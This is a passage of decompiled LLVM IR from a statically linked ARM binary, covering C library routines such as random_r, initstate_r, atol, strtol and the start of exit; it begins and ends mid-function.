  %v4_17138 = sext i8 %v3_17138 to i32
  %v2_1713c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1713c, i32* %r7.global-to-local, align 4
  %v4_17140 = mul nsw i32 %v4_17138, 4
  %v5_17140 = add i32 %v0_17140, %v4_17140
  %v1_17144 = inttoptr i32 %v0_17138 to i32*
  store i32 %v5_17140, i32* %v1_17144, align 4
  %v3_17144 = add i32 %v0_17138, 4
  %v4_17144 = inttoptr i32 %v3_17144 to i32*
  %v5_17144 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_17144, i32* %v4_17144, align 4
  br label %dec_label_pc_17150

dec_label_pc_1714c:                               ; preds = %dec_label_pc_17150
  %v0_17154 = load i32, i32* %r5.global-to-local, align 4
  %v2_1714c = inttoptr i32 %v0_17154 to i32*
  %v3_1714c = call i32 @__GI_random_r(i32* %v2_1714c, i32 %v2_1713c)
  br label %dec_label_pc_17150

dec_label_pc_17150:                               ; preds = %dec_label_pc_17130, %dec_label_pc_1714c
  %v0_17150 = load i32, i32* @r4, align 4
  %v1_17150 = add i32 %v0_17150, -1
  store i32 %v1_17150, i32* @r4, align 4
  %v6_17150 = icmp slt i32 %v1_17150, 0
  br i1 %v6_17150, label %dec_label_pc_17160, label %dec_label_pc_1714c

dec_label_pc_17160:                               ; preds = %dec_label_pc_17150, %bb23
  %v2_17168.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17164

dec_label_pc_17164:                               ; preds = %.dec_label_pc_17164_crit_edge, %dec_label_pc_17160
  %v2_17168 = phi i32 [ %v3_170a4, %.dec_label_pc_17164_crit_edge ], [ %v2_17168.pre, %dec_label_pc_17160 ]
  %v1_1716c = phi i32 [ -1, %.dec_label_pc_17164_crit_edge ], [ 0, %dec_label_pc_17160 ]
  store i32 %v2_17168, i32* @r4, align 4
  ret i32 %v1_1716c

; uselistorder directives
  uselistorder i32 %v1_17150, { 1, 0 }
  uselistorder i32 %v0_17138, { 1, 0, 2 }
  uselistorder i32 %v0_1711c.pre, { 1, 0 }
  uselistorder i32 %v5_17118, { 1, 0 }
  uselistorder i32 %v0_170fc27, { 1, 0 }
  uselistorder i32 %v0_170ec, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1f31d.1016 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_17164, { 1, 0 }
  uselistorder label %dec_label_pc_17150, { 1, 0 }
  uselistorder label %dec_label_pc_170f8, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17170:
  %v0_17170 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17170, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17170
  %v2_17170 = load i32, i32* @r7, align 4
  %v5_17170 = udiv i32 %v2_17170, 8
  %v6_17170 = and i32 %v5_17170, %arg1
  %v3_17174 = load i32, i32* @fp, align 4
  %v8_17174 = shl i32 %v6_17170, %v3_17174
  %v9_17174 = and i32 %v8_17174, %arg1
  %v2_17178 = load i32, i32* @sp, align 4
  %v8_17178 = shl i32 %v2_17178, %arg3
  %v9_17178 = and i32 %v8_17178, %arg2
  call void @__pseudo_branch(i32 %v9_17178)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17170, %bb
  %v10_17178 = phi i32 [ %arg1, %dec_label_pc_17170 ], [ %v9_17174, %bb ]
  ret i32 %v10_17178

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_1717c = load i32, i32* @r4, align 4
  %v6_1717c = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_171ac, label %dec_label_pc_1719c

dec_label_pc_1719c:                               ; preds = %entry
  %v2_1719c = icmp ugt i32 %arg2, 254
  %v7_1719c = icmp eq i32 %arg2, 255
  %v2_171a0 = xor i1 %v7_1719c, true
  %v3_171a0 = and i1 %v2_1719c, %v2_171a0
  br i1 %v3_171a0, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_1719c
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1719c, %bb
  %v1_171d87 = phi i32 [ %v3_1717c, %dec_label_pc_1719c ], [ 4, %bb ]
  %v2_171a4 = xor i1 %v2_1719c, true
  %v3_171a4 = or i1 %v7_1719c, %v2_171a4
  br i1 %v3_171a4, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_171ac:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_171c4, label %dec_label_pc_171b4

dec_label_pc_171b4:                               ; preds = %dec_label_pc_171ac
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_17234

.thread10:                                        ; preds = %dec_label_pc_171b4
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_171c4:                               ; preds = %dec_label_pc_171ac
  %v2_171c4 = icmp ugt i32 %arg2, 62
  %v7_171c4 = icmp eq i32 %arg2, 63
  %v2_171c8 = xor i1 %v7_171c4, true
  %v3_171c8 = and i1 %v2_171c4, %v2_171c8
  br i1 %v3_171c8, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_171c4
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_171c4, %bb23
  %v1_171d86 = phi i32 [ %v3_1717c, %dec_label_pc_171c4 ], [ 2, %bb23 ]
  %v2_171cc = xor i1 %v2_171c4, true
  %v3_171cc = or i1 %v7_171c4, %v2_171cc
  br i1 %v3_171cc, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_171e4 = phi i32 [ 3, %bb22 ], [ %v1_171d87, %bb21 ], [ %v1_171d86, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33984), i32* %r3.global-to-local, align 4
  %v4_171d8 = mul i32 %v1_171e4, 4
  %v5_171d8 = add i32 %v4_171d8, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33984)
  store i32 %v5_171d8, i32* %r2.global-to-local, align 4
  %v1_171dc = add i32 %v4_171d8, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33964)
  %v2_171dc = inttoptr i32 %v1_171dc to i32*
  %v3_171dc = load i32, i32* %v2_171dc, align 4
  store i32 %v3_171dc, i32* %r1.global-to-local, align 4
  %v1_171e0 = add i32 %tmp, 4
  store i32 %v1_171e0, i32* @r6, align 4
  %v6_171e4 = inttoptr i32 %v5_171d8 to i32*
  %v7_171e4 = load i32, i32* %v6_171e4, align 4
  store i32 %v7_171e4, i32* %r2.global-to-local, align 4
  %v4_171e8 = mul i32 %v3_171dc, 4
  %v5_171e8 = add i32 %v4_171e8, %v1_171e0
  store i32 %v5_171e8, i32* %r3.global-to-local, align 4
  %v2_171ec = add i32 %arg3, 16
  %v3_171ec = inttoptr i32 %v2_171ec to i32*
  store i32 %v5_171e8, i32* %v3_171ec, align 4
  %v0_171f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_171f0 = trunc i32 %v0_171f0 to i8
  %v2_171f0 = load i32, i32* @r5, align 4
  %v3_171f0 = add i32 %v2_171f0, 14
  %v4_171f0 = inttoptr i32 %v3_171f0 to i8*
  store i8 %v1_171f0, i8* %v4_171f0, align 1
  %v0_171f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_171f4 = trunc i32 %v0_171f4 to i8
  %v2_171f4 = load i32, i32* @r5, align 4
  %v3_171f4 = add i32 %v2_171f4, 13
  %v4_171f4 = inttoptr i32 %v3_171f4 to i8*
  store i8 %v1_171f4, i8* %v4_171f4, align 1
  %v0_171f8 = load i32, i32* @r4, align 4
  %v1_171f8 = trunc i32 %v0_171f8 to i8
  %v2_171f8 = load i32, i32* @r5, align 4
  %v3_171f8 = add i32 %v2_171f8, 12
  %v4_171f8 = inttoptr i32 %v3_171f8 to i8*
  store i8 %v1_171f8, i8* %v4_171f8, align 1
  %v0_171fc = load i32, i32* @r6, align 4
  %v1_171fc = load i32, i32* @r5, align 4
  %v2_171fc = add i32 %v1_171fc, 8
  %v3_171fc = inttoptr i32 %v2_171fc to i32*
  store i32 %v0_171fc, i32* %v3_171fc, align 4
  %v0_17200 = load i32, i32* @r5, align 4
  store i32 %v0_17200, i32* %r1.global-to-local, align 4
  %v0_17204 = load i32, i32* @r0, align 4
  %v2_17204 = inttoptr i32 %v0_17204 to i32*
  %v3_17204 = call i32 @srandom_r(i32* %v2_17204, i32 %v0_17200)
  store i32 %v3_17204, i32* %r0.global-to-local, align 4
  %v0_17208 = load i32, i32* @r4, align 4
  %v2_17208 = icmp eq i32 %v0_17208, 0
  br i1 %v2_17208, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_1722412 = load i32, i32* @r7, align 4
  %v2_1722413 = inttoptr i32 %v1_1722412 to i32*
  store i32 0, i32* %v2_1722413, align 4
  %v1_17228 = load i32, i32* @r4, align 4
  store i32 %v1_17228, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1724c

.thread4:                                         ; preds = %bb26
  %v1_1720c = load i32, i32* @r5, align 4
  %v2_1720c = add i32 %v1_1720c, 4
  %v3_1720c = inttoptr i32 %v2_1720c to i32*
  %v4_1720c = load i32, i32* %v3_1720c, align 4
  %v1_17210 = load i32, i32* @r6, align 4
  %v3_17210 = sub i32 %v4_1720c, %v1_17210
  %v4_17214 = sdiv i32 %v3_17210, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1721c = mul i32 %v4_17214, 5
  %v5_1721c = add i32 %v4_1721c, %v0_17208
  store i32 %v5_1721c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17224 = load i32, i32* @r7, align 4
  %v2_17224 = inttoptr i32 %v1_17224 to i32*
  store i32 0, i32* %v2_17224, align 4
  %v1_1722c = load i32, i32* %r3.global-to-local, align 4
  %v2_1722c = load i32, i32* @r7, align 4
  %v3_1722c = inttoptr i32 %v2_1722c to i32*
  store i32 %v1_1722c, i32* %v3_1722c, align 4
  %v1_17254.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1724c

dec_label_pc_17234:                               ; preds = %dec_label_pc_171b4
  %v0_17234 = call i32 @__GI___errno_location()
  store i32 %v0_17234, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1723c = inttoptr i32 %v0_17234 to i32*
  store i32 22, i32* %v2_1723c, align 4
  %v0_17240 = call i32 @__GI___errno_location()
  %v0_17244 = load i32, i32* %r4.global-to-local, align 4
  %v2_17244 = inttoptr i32 %v0_17240 to i32*
  store i32 %v0_17244, i32* %v2_17244, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1724c

dec_label_pc_1724c:                               ; preds = %bb27, %.thread4, %dec_label_pc_17234
  %v1_17254 = phi i32 [ %v1_17254.pre, %.thread4 ], [ %v1_17228, %bb27 ], [ -1, %dec_label_pc_17234 ]
  store i32 %v3_1717c, i32* @r4, align 4
  store i32 %v6_1717c, i32* @r5, align 4
  ret i32 %v1_17254

; uselistorder directives
  uselistorder i1 %v7_171c4, { 1, 0 }
  uselistorder i1 %v7_1719c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33984), { 1, 0, 2 }
  uselistorder i32 %arg2, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %dec_label_pc_1724c, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_17270 = call i32 @strtol()
  ret i32 %v0_17270
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1728c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1728c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_172b0 = load i32, i32* @r1, align 4
  store i32 %v0_172b0, i32* %fp.global-to-local, align 4
  %v0_172b4 = load i32, i32* @r2, align 4
  store i32 %v0_172b4, i32* %r5.global-to-local, align 4
  %v0_172b8 = load i32, i32* @r0, align 4
  store i32 %v0_172b8, i32* %r4.global-to-local, align 4
  %v0_172bc = load i32, i32* @r3, align 4
  br label %dec_label_pc_172c8

dec_label_pc_172c4:                               ; preds = %dec_label_pc_172c8
  %v1_172c4 = add i32 %v0_17300, 1
  store i32 %v1_172c4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_172c8

dec_label_pc_172c8:                               ; preds = %entry, %dec_label_pc_172c4
  %v0_17300 = phi i32 [ %v0_172b8, %entry ], [ %v1_172c4, %dec_label_pc_172c4 ]
  %v1_172c8 = inttoptr i32 %v0_17300 to i8*
  %v2_172c8 = load i8, i8* %v1_172c8, align 1
  %v3_172c8 = zext i8 %v2_172c8 to i32
  %v4_172cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 684) to i32*), align 4
  store i32 %v4_172cc, i32* @r2, align 4
  %v2_172d0 = mul nuw nsw i32 %v3_172c8, 2
  %v2_172d4 = add i32 %v2_172d0, %v4_172cc
  %v3_172d4 = inttoptr i32 %v2_172d4 to i16*
  %v4_172d4 = load i16, i16* %v3_172d4, align 2
  %v1_172d8 = and i16 %v4_172d4, 32
  %v2_172d8 = icmp eq i16 %v1_172d8, 0
  br i1 %v2_172d8, label %dec_label_pc_172e0, label %dec_label_pc_172c4

dec_label_pc_172e0:                               ; preds = %dec_label_pc_172c8
  %v7_172e0 = icmp eq i8 %v2_172c8, 43
  br i1 %v7_172e0, label %dec_label_pc_17300, label %dec_label_pc_172e8

dec_label_pc_172e8:                               ; preds = %dec_label_pc_172e0
  %v7_172e8 = icmp eq i8 %v2_172c8, 45
  br i1 %v7_172e8, label %dec_label_pc_17300, label %bb

bb:                                               ; preds = %dec_label_pc_172e8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17304

dec_label_pc_17300:                               ; preds = %dec_label_pc_172e0, %dec_label_pc_172e8
  %storemerge47 = phi i32 [ 1, %dec_label_pc_172e8 ], [ 0, %dec_label_pc_172e0 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_17300 = add i32 %v0_17300, 1
  store i32 %v1_17300, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17304

dec_label_pc_17304:                               ; preds = %bb, %dec_label_pc_17300
  %v0_17324 = phi i32 [ %v0_17300, %bb ], [ %v1_17300, %dec_label_pc_17300 ]
  %v1_17304 = and i32 %v0_172b4, -17
  %v3_17304 = icmp eq i32 %v1_17304, 0
  br i1 %v3_17304, label %dec_label_pc_17310, label %bb60

bb60:                                             ; preds = %dec_label_pc_17304
  br label %bb64

dec_label_pc_17310:                               ; preds = %dec_label_pc_17304
  %v1_17310 = inttoptr i32 %v0_17324 to i8*
  %v2_17310 = load i8, i8* %v1_17310, align 1
  %v7_17314 = icmp eq i8 %v2_17310, 48
  %v1_17318 = add i32 %v0_172b4, 10
  store i32 %v1_17318, i32* %r5.global-to-local, align 4
  br i1 %v7_17314, label %dec_label_pc_17324, label %bb61

bb61:                                             ; preds = %dec_label_pc_17310
  br label %.thread8

dec_label_pc_17324:                               ; preds = %dec_label_pc_17310
  %v1_17324 = add i32 %v0_17324, 1
  %v2_17324 = inttoptr i32 %v1_17324 to i8*
  %v3_17324 = load i8, i8* %v2_17324, align 1
  %v4_17324 = zext i8 %v3_17324 to i32
  store i32 %v1_17324, i32* %r4.global-to-local, align 4
  %v1_17328 = or i32 %v4_17324, 32
  %v7_1732c = icmp eq i32 %v1_17328, 120
  %v1_17330 = add i32 %v0_172b4, 8
  store i32 %v1_17330, i32* %r5.global-to-local, align 4
  br i1 %v7_1732c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_17324
  %v3_1733c = mul i32 %v1_17330, 2
  store i32 %v3_1733c, i32* %r5.global-to-local, align 4
  %v2_17340 = add i32 %v0_17324, 2
  store i32 %v2_17340, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17324, %bb61, %bb62
  %v1_1740c30 = phi i32 [ %v0_172b8, %bb61 ], [ %v1_17324, %bb62 ], [ %v1_17324, %dec_label_pc_17324 ]
  %v0_1739021 = phi i32 [ %v0_17324, %bb61 ], [ %v2_17340, %bb62 ], [ %v1_17324, %dec_label_pc_17324 ]
  %v0_17344 = phi i32 [ %v1_17318, %bb61 ], [ %v3_1733c, %bb62 ], [ %v1_17330, %dec_label_pc_17324 ]
  %v5_17348 = icmp slt i32 %v0_17344, 16
  br i1 %v5_17348, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_1740c29 = phi i32 [ %v0_172b8, %bb60 ], [ %v1_1740c30, %.thread8 ], [ %v1_1740c30, %bb63 ]
  %v0_1739020 = phi i32 [ %v0_17324, %bb60 ], [ %v0_1739021, %.thread8 ], [ %v0_1739021, %bb63 ]
  %v0_17370 = phi i32 [ %v0_172b4, %bb60 ], [ %v0_17344, %.thread8 ], [ 16, %bb63 ]
  %v1_1734c = add i32 %v0_17370, -2
  %tmp = icmp ugt i32 %v1_1734c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_1735c

.thread:                                          ; preds = %bb64
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17408

dec_label_pc_1735c:                               ; preds = %bb64
  %v2_17364 = udiv i32 -1, %v0_17370
  %v3_17364 = urem i32 -1, %v0_17370
  %v1_17374 = urem i32 %v3_17364, 256
  store i32 %v1_17374, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v2_17364, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17390

dec_label_pc_1738c:                               ; preds = %bb71, %dec_label_pc_173ec
  %v0_1738c = phi i32 [ %v1_173cc44, %bb71 ], [ %v0_1738c.pre, %dec_label_pc_173ec ]
  br label %dec_label_pc_17390

dec_label_pc_17390:                               ; preds = %dec_label_pc_1735c, %dec_label_pc_1738c
  %v1_1740c27 = phi i32 [ %v1_1740c29, %dec_label_pc_1735c ], [ %v0_1738c, %dec_label_pc_1738c ]
  %v0_173cc = phi i32 [ %v0_1739020, %dec_label_pc_1735c ], [ %v0_1738c, %dec_label_pc_1738c ]
  %v1_17390 = inttoptr i32 %v0_173cc to i8*
  %v2_17390 = load i8, i8* %v1_17390, align 1
  %v3_17390 = zext i8 %v2_17390 to i32
  %v1_17394 = add nsw i32 %v3_17390, -48
  %v1_17398 = urem i32 %v1_17394, 256
  %v1_173a0 = or i32 %v3_17390, 32
  store i32 %v1_173a0, i32* @r2, align 4
  %tmp79 = icmp ult i32 %v1_17398, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_173a8

dec_label_pc_173a8:                               ; preds = %dec_label_pc_17390
  %v1_173ac = add nsw i32 %v1_173a0, -87
  store i32 %v1_173ac, i32* @r2, align 4
  %tmp80 = icmp ugt i32 %v1_173a0, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_173a8
  %v5_173b4 = urem i32 %v1_173ac, 256
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_17390, %dec_label_pc_173a8, %bb65
  %v3_173e4 = phi i32 [ %v1_17398, %dec_label_pc_17390 ], [ 40, %dec_label_pc_173a8 ], [ %v5_173b4, %bb65 ]
  %v1_173b8 = load i32, i32* %r5.global-to-local, align 4
  %v6_173bc = icmp slt i32 %v3_173e4, %v1_173b8
  br i1 %v6_173bc, label %dec_label_pc_173c0, label %dec_label_pc_17408.loopexit

dec_label_pc_173c0:                               ; preds = %bb66
  %v0_173c0 = load i32, i32* @ip, align 4
  %v1_173c0 = load i32, i32* %r8.global-to-local, align 4
  %v9_173c0 = icmp eq i32 %v0_173c0, %v1_173c0
  br i1 %v9_173c0, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_173c0
  %v1_173cc40 = add i32 %v0_173cc, 1
  store i32 %v1_173cc40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_173d4

bb67:                                             ; preds = %dec_label_pc_173c0
  %v3_173c0 = icmp ult i32 %v0_173c0, %v1_173c0
  %v1_173cc = add i32 %v0_173cc, 1
  store i32 %v1_173cc, i32* %r4.global-to-local, align 4
  br i1 %v3_173c0, label %dec_label_pc_173d4, label %dec_label_pc_173ec

dec_label_pc_173d4:                               ; preds = %bb67, %.thread39
  %v1_173cc44 = phi i32 [ %v1_173cc40, %.thread39 ], [ %v1_173cc, %bb67 ]
  %v4_173dc2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_173d4 = load i32, i32* %sl.global-to-local, align 4
  %v3_173d4 = icmp uge i32 %v3_173e4, %v1_173d4
  %v9_173d4 = icmp eq i32 %v3_173e4, %v1_173d4
  %v2_173d8 = xor i1 %v3_173d4, true
  %v3_173d8 = or i1 %v9_173d4, %v2_173d8
  br i1 %v3_173d8, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_173d4
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_173d4, %bb68
  %v4_173dc = phi i32 [ %v4_173dc2443, %dec_label_pc_173d4 ], [ 0, %bb68 ]
  %v2_173dc = xor i1 %v9_173d4, true
  %v3_173dc = and i1 %v3_173d4, %v2_173dc
  br i1 %v3_173dc, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_173dc = urem i32 %v4_173dc, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_173e0 = phi i32 [ %v5_173dc, %bb70 ], [ %v4_173dc, %bb69 ]
  %v2_173e0 = icmp eq i32 %v0_173e0, 0
  br i1 %v2_173e0, label %bb71, label %dec_label_pc_173ec

bb71:                                             ; preds = %thread-pre-split
  %v4_173e4 = mul i32 %v0_173c0, %v1_173b8
  %v5_173e4 = add i32 %v4_173e4, %v3_173e4
  store i32 %v5_173e4, i32* @ip, align 4
  br label %dec_label_pc_1738c

dec_label_pc_173ec:                               ; preds = %bb67, %thread-pre-split
  %v0_173ec = call i32 @__GI___errno_location()
  %v0_173f4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_173f4, i32* @ip, align 4
  %v0_173f8 = load i32, i32* %r7.global-to-local, align 4
  %v2_173f8 = and i32 %v0_173f8, %v0_172bc
  store i32 %v2_173f8, i32* %r7.global-to-local, align 4
  %v2_17400 = inttoptr i32 %v0_173ec to i32*
  store i32 34, i32* %v2_17400, align 4
  %v0_1738c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1738c

dec_label_pc_17408.loopexit:                      ; preds = %bb66
  %v0_17408.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17408

dec_label_pc_17408:                               ; preds = %.thread, %dec_label_pc_17408.loopexit
  %v1_1740c = phi i32 [ %v1_1740c27, %dec_label_pc_17408.loopexit ], [ %v1_1740c29, %.thread ]
  %v2_1740c = phi i32 [ %v0_17408.pre, %dec_label_pc_17408.loopexit ], [ %v0_172b0, %.thread ]
  %v2_17408 = icmp eq i32 %v2_1740c, 0
  br i1 %v2_17408, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_17408
  %v3_1740c = inttoptr i32 %v2_1740c to i32*
  store i32 %v1_1740c, i32* %v3_1740c, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_17408, %bb72
  %v0_17414 = load i32, i32* %r7.global-to-local, align 4
  %v2_17414 = icmp eq i32 %v0_17414, 0
  %. = select i1 %v2_17414, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_17420 = icmp eq i32 %v0_172bc, 0
  %v0_17444.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_17420, label %dec_label_pc_1743c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_17444.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_1742c, label %dec_label_pc_1743c

dec_label_pc_1742c:                               ; preds = %bb76
  %v0_1742c = call i32 @__GI___errno_location()
  %v2_17434 = inttoptr i32 %v0_1742c to i32*
  store i32 34, i32* %v2_17434, align 4
  %v0_17438 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17438, i32* @ip, align 4
  %v0_1743c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1743c

dec_label_pc_1743c:                               ; preds = %bb76, %bb73, %dec_label_pc_1742c
  %v0_17444.pre = phi i32 [ %v0_17444.pre.pre, %bb76 ], [ %v0_17438, %dec_label_pc_1742c ], [ %v0_17444.pre.pre, %bb73 ]
  %v0_1743c = phi i32 [ %v0_17414, %bb76 ], [ %v0_1743c.pre, %dec_label_pc_1742c ], [ %v0_17414, %bb73 ]
  %v2_1743c = icmp eq i32 %v0_1743c, 0
  br i1 %v2_1743c, label %dec_label_pc_1743c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_1743c
  %v2_17440 = sub i32 0, %v0_17444.pre
  store i32 %v2_17440, i32* @ip, align 4
  br label %dec_label_pc_1743c._crit_edge

dec_label_pc_1743c._crit_edge:                    ; preds = %dec_label_pc_1743c, %bb77
  %v0_17444 = phi i32 [ %v2_17440, %bb77 ], [ %v0_17444.pre, %dec_label_pc_1743c ]
  ret i32 %v0_17444

; uselistorder directives
  uselistorder i32 %v0_17444.pre, { 1, 0 }
  uselistorder i32 %v0_17444.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_173dc, { 1, 0 }
  uselistorder i1 %v3_173d4, { 1, 0 }
  uselistorder i32 %v1_173d4, { 1, 0 }
  uselistorder i32 %v1_17398, { 1, 0 }
  uselistorder i32 %v0_173cc, { 1, 0, 2 }
  uselistorder i32 %v0_1738c, { 1, 0 }
  uselistorder i32 %v3_1733c, { 1, 0 }
  uselistorder i32 %v1_17330, { 1, 0, 2 }
  uselistorder i32 %v0_17324, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_17300, { 0, 1, 3, 2 }
  uselistorder i32 %v0_172bc, { 1, 0 }
  uselistorder i32 %v0_172b8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_172b4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_1743c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1743c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_17408, { 1, 0 }
  uselistorder label %dec_label_pc_173ec, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17390, { 1, 0 }
  uselistorder label %dec_label_pc_1738c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17304, { 1, 0 }
  uselistorder label %dec_label_pc_17300, { 1, 0 }
  uselistorder label %dec_label_pc_172c8, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
